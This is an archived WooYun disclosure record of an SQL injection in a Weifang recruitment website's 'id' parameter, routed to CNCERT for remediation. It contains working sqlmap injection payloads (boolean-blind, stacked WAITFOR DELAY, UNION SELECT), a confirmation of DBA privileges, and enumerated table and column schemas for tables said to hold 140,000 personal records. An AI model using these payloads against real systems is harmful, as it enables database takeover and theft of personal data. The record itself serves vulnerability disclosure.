{"id": 79899, "wybug_id": "wooyun-2015-0157082", "wybug_title": "潍坊人才网SQL注入（DBA权限）14万数据泄露", "wybug_corp": "潍坊人才网", "wybug_author": "BlackWolf", "wybug_date": "2015-12-02 02:02", "wybug_open_date": "2016-01-18 16:50", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-12-02：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-12-04：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-12-14：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-12-24：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-03：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2016-01-18：\t细节向公众公开  简要描述： 注入 详细说明：  \nhttp://**.**.**.**/wpage/content.jsp?id=2947Parameter: id (GET)    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: id=2947 AND 2735=2735    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries (comment)    Payload: id=2947;WAITFOR DELAY '0:0:5'--    Type: UNION query    Title: Generic UNION query (NULL) - 12 columns    Payload: id=2947 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CHAR(113)+CHAR(118)+CHAR(120)+CHAR(120)+CHAR(113)+CHAR(117)+CHAR(83)+CHAR(103)+CHAR(89)+CHAR(81)+CHAR(105)+CHAR(73)+CHAR(81)+CHAR(82)+CHAR(86)+CHAR(73)+CHAR(111)+CHAR(83)+CHAR(87)+CHAR(77)+CHAR(114)+CHAR(116)+CHAR(87)+CHAR(77)+CHAR(90)+CHAR(79)+CHAR(84)+CHAR(65)+CHAR(102)+CHAR(106)+CHAR(104)+CHAR(97)+CHAR(115)+CHAR(70)+CHAR(97)+CHAR(70)+CHAR(75)+CHAR(106)+CHAR(102)+CHAR(117)+CHAR(118)+CHAR(117)+CHAR(71)+CHAR(65)+CHAR(109)+CHAR(113)+CHAR(98)+CHAR(118)+CHAR(118)+CHAR(113),NULL,NULL,NULL-----[10:34:35] [INFO] the back-end DBMS is Microsoft SQL Serverweb application technology: JSPback-end DBMS: Microsoft SQL Server 2008[10:34:35] [INFO] testing if current user is DBAcurrent user is DBA:    True\n   漏洞证明：  注入点：\n\n库名：\n\n\n表名：Database: wfrcw[48 tables]+--------------+| dtproperties || t_adv        || t_comcx_user || t_comcx_user || t_comfiter2  || t_comfiter2  || t_comgdfiter || t_company    || t_comrdfiter || t_dyzj       || t_fzmsgsys   || t_fzmsgxx    || t_fzwz       || t_fzxx       || t_gjcx       || t_gjpc       || t_gjrc       || t_info       || t_jiaozhu    || t_jlxm       || t_link       || t_log        || t_msgsys     || t_msgxx      || t_qt         || t_qtyg       || t_sc_user    || t_sc_user    || t_user       || t_wadmin     || t_wadv       || t_wconfig    || t_wdc        || t_wdc        || t_wdlb       || t_wfk        || t_wg         || t_wh         || t_whxm       || t_wmenu      || t_wnews      || t_wqq        || t_wsm        || t_wsq        || t_wt         || t_zp         || t_zwcx       || t_zwcx       |+--------------+\n\n2000企业用户数据：Database: wfrcwTable: t_company[57 columns]+---------+----------+| Column  | Type     |+---------+----------+| address | varchar  || cjrq    | datetime || ckcs    | int      || com     | varchar  || cxqx    | int      || cxrq1   | datetime || cxrq2   | datetime || cxsl    | int      || da      | varchar  || dlcs    | int      || dlrq    | datetime || email   | varchar  || fax     | varchar  || gdpx    | int      || gdrq    | datetime || gdszrq  | datetime || gkbz    | varchar  || hylx    | varchar  || id      | int      || ifemail | varchar  || ifgd    | varchar  || ifjl    | varchar  || ifjr    | varchar  || iflx    | varchar  || ifxy    | varchar  || ifxz    | varchar  || ip      | varchar  || jj      | text     || jtcs    | int      || jzrq    | datetime || lxr     | varchar  || mobile  | varchar  || name    | varchar  || pass    | varchar  || phone   | varchar  || pic     | varchar  || post    | varchar  || px      | int      || qq      | varchar  || rdbz    | varchar  || rdpx    | int      || rdrq    | datetime || rdszrq  | datetime || redrq   | datetime || rs      | varchar  || sex     | varchar  || shbz    | varchar  || szd     | varchar  || tybz    | varchar  || web     | varchar  || wt      | varchar  || wz      | varchar  || xz      | varchar  || zcrq    | datetime || zczj    | varchar  || zw      | varchar  || zxbz    | varchar  |+---------+----------+\n\n\n\nDatabase: wfrcwTable: 14万个人用户数据：t_user[64 columns]+---------+----------+| Column  | Type     |+---------+----------+| address | varchar  || age     | varchar  || byrq    | datetime || byxx    | varchar  || cjrq    | datetime || ckcs    | int      || cs      | int      || da      | varchar  || dlrq    | datetime || email   | varchar  || gl      | varchar  || grzz    | text     || gzdq    | varchar  || gzjl    | text     || hj      | varchar  || hylx    | varchar  || hyzk    | varchar  || id      | int      || ip      | varchar  || jlbz    | int      || ksqz    | varchar  || lx      | varchar  || mobile  | varchar  || mz      | varchar  || name    | varchar  || pass    | varchar  || phone   | varchar  || pic     | varchar  || post    | varchar  || pth     | varchar  || pxjl    | text     || qq      | varchar  || qzfs    | varchar  || rxrq    | datetime || sex     | varchar  || sg      | varchar  || shbz    | varchar  || sp1     | varchar  || sp2     | varchar  || szd     | varchar  || tc      | text     || tybz    | varchar  || web     | varchar  || wt      | varchar  || wy1     | varchar  || wy2     | varchar  || xl      | varchar  || xmbz    | varchar  || xy      | varchar  || yx      | varchar  || zc      | varchar  || zjhm    | varchar  || zjlx    | varchar  || zs      | text     || zwhy1   | varchar  || zwhy2   | varchar  || zwlb1   | varchar  || zwlb2   | varchar  || zwlbid  | int      || zxbz    | varchar  || zylb    | varchar  || zymc    | varchar  || zyzt    | varchar  || zzmm    | varchar  |+---------+----------+\n\n\n   修复方案：  过滤   版权声明：转载请注明来源 BlackWolf@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-12-04 16:48 厂商回复： CNVD确认并复现所述情况,已经转由CNCERT下发给山东分中心,由其后续协调网站管理单位处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}